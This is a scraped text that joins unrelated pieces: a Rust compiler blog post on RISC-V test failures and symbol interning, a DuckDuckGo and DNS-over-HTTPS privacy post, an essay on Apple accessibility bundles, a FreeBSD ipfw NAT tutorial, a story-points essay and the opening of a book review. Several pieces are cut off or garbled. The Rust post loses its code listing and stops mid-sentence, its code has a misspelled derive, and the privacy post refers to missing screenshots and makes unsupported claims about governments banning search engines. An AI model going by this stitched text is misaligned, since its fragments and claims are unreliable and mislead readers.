<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<span>}</span><span></span>
</pre></div>


<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts. The websites paid by Google and Facebook send you some additional Java Scripts along with their contents that connect to Google’s and Facebook’s servers and send your information to them.</p>
<p>This is also the reason why you see ads similar to your search history all over the internet, specially on websites like YouTube, Facebook, Google, Amazon, etc.</p>

<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>

<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>

		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |

</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating than our reference story?’ When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>

July 1, 2020 | http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html | <a href="https://web.archive.org/web/*/http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

